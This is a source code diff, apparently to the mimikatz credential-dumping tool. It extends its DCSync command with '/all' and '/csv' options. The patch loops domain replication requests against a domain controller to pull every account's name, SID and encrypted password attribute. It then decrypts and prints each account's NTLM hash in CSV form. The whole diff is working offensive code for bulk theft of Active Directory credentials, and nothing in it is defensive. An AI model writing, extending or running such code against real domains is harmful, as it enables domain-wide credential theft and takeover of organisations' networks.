@@ -1702,6 +1702,11 @@ LPCSTR kuhl_m_lsadump_dcsync_oids[] = {
 	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
 	szOID_ANSI_currentValue,
 };
+LPCSTR kuhl_m_lsadump_dcsync_oids_export[] = {
+	szOID_ANSI_name,
+	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
+	szOID_ANSI_unicodePwd
+};
 NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 {
 	LSA_OBJECT_ATTRIBUTES objectAttributes = {0};
@@ -1717,7 +1722,9 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	LPWSTR szTmpDc = NULL;
 	DRS_EXTENSIONS_INT DrsExtensionsInt;
 	BOOL someExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
-
+	BOOL allData = kull_m_string_args_byName(argc, argv, L"all", NULL, NULL);
+	BOOL csvOutput = kull_m_string_args_byName(argc, argv, L"csv", NULL, NULL);
+	BOOL moreData = FALSE;
 	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
 			szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;
@@ -1732,9 +1739,11 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 		if(szDc)
 		{
 			kprintf(L"[DC] \'%s\' will be the DC server\n", szDc);
-			if(kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
+			if(allData || kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 			{
-				if(szGuid)
+				if(allData)
+					kprintf(L"[DC] Exporting domain \'%s\'\n", szDomain);
+				else if(szGuid)
 					kprintf(L"[DC] Object with GUID \'%s\'\n", szGuid);
 				else
 					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
@@ -1750,33 +1759,66 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 						{
 							getChReq.V8.pNC = &dsName;
 							getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
-							getChReq.V8.cMaxObjects = 1;
+							getChReq.V8.cMaxObjects = (allData?1000:1);
 							getChReq.V8.cMaxBytes = 0x00a00000; // 10M
-							getChReq.V8.ulExtendedOp = EXOP_REPL_OBJ;
+							getChReq.V8.ulExtendedOp = (allData?0:EXOP_REPL_OBJ);
 
-							if(getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT *) MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * (ARRAYSIZE(kuhl_m_lsadump_dcsync_oids) - 1)))
+							if(getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT *) MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData? ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export) : ARRAYSIZE(kuhl_m_lsadump_dcsync_oids)) - 1)))
 							{
 								getChReq.V8.pPartialAttrSet->dwVersion = 1;
 								getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
-								getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids);
-								for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
-									kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
-
+								if (allData)
+								{
+									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export);
+									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
+										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids_export[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
+								}
+								else
+								{
+									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids);
+									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
+										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
+								}
 								RpcTryExcept
 								{
-									drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
-									if(drsStatus == 0)
+									do
 									{
-										if((dwOutVersion == 6) && (getChRep.V6.cNumObjects == 1))
+										drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
+										if(drsStatus == 0)
 										{
-											if(kull_m_rpc_drsr_ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
-												kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &getChRep.V6.pObjects[0].Entinf.AttrBlock, szDomain, someExport);
-											else PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
+											if(dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
+											{
+												if(kull_m_rpc_drsr_ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
+												{
+													REPLENTINFLIST* pObject = getChRep.V6.pObjects;
+													for (i = 0; i < getChRep.V6.cNumObjects; i++)
+													{
+														if (csvOutput)
+															kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock);
+														else
+															kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, someExport);
+														pObject = pObject->pNextEntInf;
+													}
+												}
+												else
+												{
+													PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
+													break;
+												}
+												if (allData)
+												{
+													moreData = getChRep.V6.fMoreData;
+													RtlCopyMemory(&getChReq.V8.uuidInvocIdSrc, &getChRep.V6.uuidInvocIdSrc, sizeof(UUID));
+													RtlCopyMemory(&getChReq.V8.usnvecFrom, &getChRep.V6.usnvecTo, sizeof(USN_VECTOR));
+												}
+											}
+											else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
+											kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
+											ZeroMemory(&getChRep, sizeof(DRS_MSG_GETCHGREPLY));
 										}
-										else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
-										kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
+										else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
 									}
-									else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
+									while(moreData);
 									IDL_DRSUnbind(&hDrs);
 								}
 								RpcExcept(RPC_EXCEPTION)
@@ -1825,6 +1867,32 @@ BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWO
 		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
 	}
 	return status;
+}
+
+void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
+{
+	DWORD rid = 0;
+	PVOID samAccountName;
+	PBYTE unicodePwd;
+	DWORD unicodePwdSize;
+	PVOID sid;
+	BYTE clearHash[LM_NTLM_HASH_LENGTH];
+
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, &samAccountName, NULL) &&
+		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &sid, NULL) &&
+		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &unicodePwd, &unicodePwdSize))
+	{
+		rid = *GetSidSubAuthority(sid, *GetSidSubAuthorityCount(sid) - 1);
+		kull_m_rpc_drsr_findPrintMonoAttr(NULL, prefixTable, attributes, szOID_ANSI_sAMAccountName, FALSE);
+		kprintf(L"\t");
+		kull_m_rpc_drsr_findPrintMonoAttr(NULL, prefixTable, attributes, szOID_ANSI_unicodePwd, FALSE);
+		if(NT_SUCCESS(RtlDecryptDES2blocks1DWORD(unicodePwd, &rid, clearHash)))
+		{
+			kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
+		}
+		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
+		kprintf(L"\n");
+	}
 }
 
 void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain, BOOL someExport)
